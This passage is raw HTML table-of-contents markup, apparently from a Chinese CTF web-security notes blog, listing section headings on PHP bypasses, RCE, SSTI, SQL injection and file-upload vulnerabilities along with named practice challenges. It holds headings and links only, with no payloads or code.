class="toc-text">SHA1强碰撞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%81%E6%B1%82MD5%E5%92%8CSHA1%E5%88%86%E5%88%AB%E7%9B%B8%E7%AD%89"><span class="toc-number">1.9.2.5.</span> <span class="toc-text">要求MD5和SHA1分别相等</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URL%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.2.6.</span> <span class="toc-text">URL二次编码绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="toc-number">1.9.3.</span> <span class="toc-text">数组绕过正则匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extract%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.9.4.</span> <span class="toc-text">extract覆盖漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87strcmp%E6%AF%94%E8%BE%83"><span class="toc-number">1.9.5.</span> <span class="toc-text">数组绕过strcmp比较</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#creat-function-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="toc-number">1.9.6.</span> <span class="toc-text">creat_function()代码注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.9.7.</span> <span class="toc-text">PHP伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.9.7.1.</span> <span class="toc-text">data伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter"><span class="toc-number">1.9.7.2.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-input"><span class="toc-number">1.9.7.3.</span> <span class="toc-text">php:&#x2F;&#x2F;input</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE%EF%BC%88Php%EF%BC%89"><span class="toc-number">1.10.</span> <span class="toc-text">RCE（Php）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.10.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE%E7%BB%95%E8%BF%87%E6%8C%87%E5%8D%97"><span class="toc-number">1.10.2.</span> <span class="toc-text">RCE绕过指南</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.1.</span> <span class="toc-text">命令绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.2.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%89%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.3.</span> <span class="toc-text">等号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.4.</span> <span class="toc-text">_ 绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AB%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.5.</span> <span class="toc-text">八进制绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-1"><span class="toc-number">1.10.2.6.</span> <span class="toc-text">&#x2F; 绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-2"><span class="toc-number">1.10.2.7.</span> <span class="toc-text"># 绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8D%A2%E8%A1%8C%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.8.</span> <span class="toc-text">换行符绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-3"><span class="toc-number">1.10.2.9.</span> <span class="toc-text">. 绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.10.</span> <span class="toc-text">* 通配符绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%80%98-%E2%80%98-%E7%A9%BA%E5%AD%97%E7%AC%A6%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.11.</span> <span class="toc-text">‘ ‘ 空字符匹配绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.12.</span> <span class="toc-text">\ 匹配绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%A0%E4%BD%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.13.</span> <span class="toc-text">? 占位绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.14.</span> <span class="toc-text">flag绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.15.</span> <span class="toc-text">URL编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.16.</span> <span class="toc-text">php绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#and%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.17.</span> <span class="toc-text">and绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E9%83%A8%E5%AD%97%E6%AF%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.18.</span> <span class="toc-text">全部字母绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E5%8F%82%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.19.</span> <span class="toc-text">传参绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E6%8C%9F%E6%8C%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.20.</span> <span class="toc-text">变量挟持绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%9E%9A%E4%B8%BE%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.21.</span> <span class="toc-text">文件枚举绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.22.</span> <span class="toc-text">文件读取绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.23.</span> <span class="toc-text">目录穿越绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.24.</span> <span class="toc-text">读取文件绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981-%E6%97%A0%E8%BF%87%E6%BB%A4%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.10.3.</span> <span class="toc-text">例题1-无过滤简单命令拼接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CTFHub"><span class="toc-number">1.10.3.1.</span> <span class="toc-text">CTFHub</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%982-%E7%BB%93%E5%90%88php-amp-%E8%BF%87%E6%BB%A4%E5%91%BD%E4%BB%A4"><span class="toc-number">1.10.4.</span> <span class="toc-text">例题2-结合php &amp; 过滤命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-R-C-E"><span class="toc-number">1.10.4.1.</span> <span class="toc-text">BUUCTF在线评测 R!C!E!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-RCEService"><span class="toc-number">1.10.4.2.</span> <span class="toc-text">BUUCTF在线评测 RCEService</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-Begin-of-PHP"><span class="toc-number">1.10.4.3.</span> <span class="toc-text">BUUCTF在线评测 Begin of PHP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CMCTF-CM-CTF-%E5%87%BD%E6%95%B0%E9%87%8D%E7%94%9F%E7%89%88"><span class="toc-number">1.10.4.4.</span> <span class="toc-text">CMCTF - CM::CTF 函数重生版</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2025H-amp-NCTF-2025H-amp-N-CTF-Really-Ez-Rce"><span class="toc-number">1.10.4.5.</span> <span class="toc-text">2025H&amp;NCTF - 2025H&amp;N::CTF Really_Ez_Rce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-EasyByPass"><span class="toc-number">1.10.4.6.</span> <span class="toc-text">BUUCTF在线评测 EasyByPass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-Write-shell"><span class="toc-number">1.10.4.7.</span> <span class="toc-text">BUUCTF在线评测 Write_shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E6%BA%AF%E9%99%90%E5%88%B6"><span class="toc-number">1.10.5.</span> <span class="toc-text">回溯限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NISACTF-2022-middlerce-NSSCTF"><span class="toc-number">1.10.5.1.</span> <span class="toc-text">[NISACTF 2022]middlerce | NSSCTF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-number">1.10.6.</span> <span class="toc-text">无回显RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8http%E6%A0%87%E5%A4%B4"><span class="toc-number">1.10.6.1.</span> <span class="toc-text">利用http标头</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AA%E5%85%81%E8%AE%B8%E7%94%A8%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="toc-number">1.10.6.2.</span> <span class="toc-text">只允许用特殊字符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6%E5%88%B0%E5%85%B6%E4%BB%96%E5%9C%B0%E6%96%B9"><span class="toc-number">1.10.6.3.</span> <span class="toc-text">写文件到其他地方</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">1.10.7.</span> <span class="toc-text">无参数RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">1.10.7.1.</span> <span class="toc-text">BUUCTF在线评测 禁止套娃</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">1.11.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.11.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Smarty-SSTI"><span class="toc-number">1.11.2.</span> <span class="toc-text">Smarty SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.11.3.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-number">1.11.4.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E4%B8%A4%E4%B8%AA%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.11.4.1.</span> <span class="toc-text">过滤了两个大括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.11.4.2.</span> <span class="toc-text">字符串拼接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86"><span class="toc-number">1.11.4.3.</span> <span class="toc-text">过滤了 .</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#request-args%E9%80%83%E9%80%B8"><span class="toc-number">1.11.5.</span> <span class="toc-text">request.args逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-1"><span class="toc-number">1.11.5.1.</span> <span class="toc-text">过滤了 []</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-config"><span class="toc-number">1.11.5.2.</span> <span class="toc-text">过滤了 config</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-init"><span class="toc-number">1.11.5.3.</span> <span class="toc-text">过滤了__init__</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86os"><span class="toc-number">1.11.5.4.</span> <span class="toc-text">过滤了os</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E8%BF%87%E6%BB%A4"><span class="toc-number">1.11.5.5.</span> <span class="toc-text">编码过滤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E9%AB%98%E7%AB%AF%E7%9A%84%E2%88%9E"><span class="toc-number">1.11.6.</span> <span class="toc-text">一些高端的∞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E7%B1%BB-Undefined"><span class="toc-number">1.11.6.1.</span> <span class="toc-text">内置类 Undefined</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.11.6.2.</span> <span class="toc-text">过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#set"><span class="toc-number">1.11.6.2.1.</span> <span class="toc-text">set</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#attr"><span class="toc-number">1.11.6.2.2.</span> <span class="toc-text">attr()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lipsum"><span class="toc-number">1.11.6.3.</span> <span class="toc-text">lipsum</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#url-for%E3%80%81get-flashed-messages"><span class="toc-number">1.11.6.4.</span> <span class="toc-text">url_for、get_flashed_messages</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bytes"><span class="toc-number">1.11.6.5.</span> <span class="toc-text">bytes</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add-api-route"><span class="toc-number">1.11.6.6.</span> <span class="toc-text">add_api_route()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A5%87%E5%A6%99%E7%9A%84%E6%80%9D%E8%B7%AF1"><span class="toc-number">1.11.6.7.</span> <span class="toc-text">奇妙的思路1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A5%87%E5%A6%99%E7%9A%84%E6%80%9D%E8%B7%AF2"><span class="toc-number">1.11.6.8.</span> <span class="toc-text">奇妙的思路2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E4%B8%8D%E7%94%A8%E5%8A%A8%E8%84%91%E7%9A%84%EF%BC%88%EF%BC%89"><span class="toc-number">1.11.7.</span> <span class="toc-text">一些不用动脑的（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BE%8B%E9%A2%98"><span class="toc-number">1.11.8.</span> <span class="toc-text">基础例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RUST%E4%B8%8B%E7%9A%84SSTI"><span class="toc-number">1.11.8.1.</span> <span class="toc-text">RUST下的SSTI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HNCTF-2022-WEEK2-ez-SSTI-NSSCTF"><span class="toc-number">1.11.8.2.</span> <span class="toc-text">HNCTF 2022 WEEK2]ez_SSTI | NSSCTF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-Flasklight"><span class="toc-number">1.11.8.3.</span> <span class="toc-text">BUUCTF在线评测 Flasklight</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-number">1.11.9.</span> <span class="toc-text">综合绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-python-template-injection"><span class="toc-number">1.11.9.1.</span> <span class="toc-text">攻防世界 Web_python_template_injection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LitCTF-2025-%E6%98%9F%E6%84%BF%E4%BF%A1%E7%AE%B1-NSSCTF"><span class="toc-number">1.11.9.2.</span> <span class="toc-text">LitCTF 2025]星愿信箱 | NSSCTF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-2024-GoldenHornKing-NSSCTF"><span class="toc-number">1.11.9.3.</span> <span class="toc-text">巅峰极客 2024]GoldenHornKing | NSSCTF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL"><span class="toc-number">1.12.</span> <span class="toc-text">SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.12.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.12.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">1.12.3.</span> <span class="toc-text">常用参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">1.12.4.</span> <span class="toc-text">基本命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-1"><span class="toc-number">1.12.5.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87-1"><span class="toc-number">1.12.5.1.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.12.5.2.</span> <span class="toc-text">逗号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%89%E5%8F%B7%E7%BB%95%E8%BF%87-1"><span class="toc-number">1.12.5.3.</span> <span class="toc-text">等号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.12.5.4.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9B%B8%E4%BA%92%E4%BB%A3%E6%9B%BF"><span class="toc-number">1.12.5.5.</span> <span class="toc-text">符号和字母相互代替</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%A1%A8%E6%A0%BC"><span class="toc-number">1.12.5.6.</span> <span class="toc-text">创建表格</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.12.6.</span> <span class="toc-text">联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-NewsCenter"><span class="toc-number">1.12.6.1.</span> <span class="toc-text">攻防世界 NewsCenter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-Baby-SQL%EF%BC%88%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.12.6.2.</span> <span class="toc-text">BUUCTF在线评测 Baby SQL（双写绕过）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-EZ-sql%EF%BC%88%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.12.6.3.</span> <span class="toc-text">BUUCTF在线评测 EZ_sql（大小写绕过）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.12.7.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.12.7.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.12.8.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.12.8.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-Hack-World"><span class="toc-number">1.12.8.2.</span> <span class="toc-text">BUUCTF在线评测 Hack World</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.12.9.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">1.12.9.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.12.10.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">1.12.10.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-CISCN-CyberPunk"><span class="toc-number">1.12.10.2.</span> <span class="toc-text">BUUCTF在线评测 CISCN CyberPunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.12.10.3.</span> <span class="toc-text">BUUCTF在线评测 二次注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-number">1.12.11.</span> <span class="toc-text">UDF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.12.12.</span> <span class="toc-text">宽字节注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.13.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-5"><span class="toc-number">1.13.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9Aphp-phtml%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.13.2.</span> <span class="toc-text">普通php&#x2F;phtml文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8C%85%E6%9B%B4%E6%94%B9%E5%90%8E%E7%BC%80"><span class="toc-number">1.13.3.</span> <span class="toc-text">抓包更改后缀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-number">1.13.4.</span> <span class="toc-text">%00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-htaccess%E6%88%96%E8%80%85user-ini%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.13.5.</span> <span class="toc-text">通过.htaccess或者user.ini进行文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.13.6.</span> <span class="toc-text">解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90"><span class="toc-number">1.13.6.1.</span> <span class="toc-text">目录解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="toc-number">1.13.6.2.</span> <span class="toc-text">文件解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.13.6.3.</span> <span class="toc-text">Apache解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.13.6.4.</span> <span class="toc-text">Nginx解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS7-5%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.13.6.5.</span> <span class="toc-text">IIS7.5解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">1.13.7.</span> <span class="toc-text">竞争条件攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.13.8.</span> <span class="toc-text">双文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%A0%E9%A9%AC"><span class="toc-number">1.13.9.</span> <span class="toc-text">ZIP压缩包传马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="toc-number">1.13.10.</span> <span class="toc-text">图片马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-number">1.13.11.</span> <span class="toc-text">二次渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GIF%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-number">1.13.11.1.</span> <span class="toc-text">GIF二次渲染</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PNG%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-number">1.13.11.2.</span> <span 